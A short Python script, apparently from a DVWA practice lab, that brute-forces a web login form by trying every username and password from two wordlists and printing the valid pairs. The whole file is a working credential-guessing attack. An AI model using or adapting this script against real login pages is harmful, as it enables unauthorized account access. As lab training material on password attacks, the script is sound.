import requests

base_url = "http://172.17.0.2/vulnerabilities/brute/"

# Leer usuarios y contraseñas desde archivos
def cargar_lista_archivo(nombre_archivo):
    with open(nombre_archivo, 'r') as archivo:
        return [line.strip() for line in archivo.readlines()]

# Cargar los usuarios y contraseñas desde los archivos
usuarios = cargar_lista_archivo("users.txt")
passwords = cargar_lista_archivo("pass.txt")

# Cookies necesarias para mantener sesión
cookies = {
    "PHPSESSID": "ntjt8g582rg8vth665a68s64r3",   
    "security": "low"                    
}

# Headers 
headers = {
    "User-Agent": "Mozilla/5.0"
}

# Función de prueba de credenciales
def probar_credenciales(user, pwd):
    params = {
        "username": user,
        "password": pwd,
        "Login": "Login"
    }

    response = requests.get(base_url, params=params, cookies=cookies, headers=headers)

    if "Username and/or password incorrect" not in response.text:
        return True
    return False

# Prueba de combinaciones
validas = []

for user in usuarios:
    for pwd in passwords:
        if probar_credenciales(user, pwd):
            print(f"[+] Credenciales válidas: {user} : {pwd}")
            validas.append((user, pwd))
        else:
            print(f"[-] Falló: {user} : {pwd}")

print("\nCredenciales encontradas:")
for u, p in validas:
    print(f"{u}:{p}")

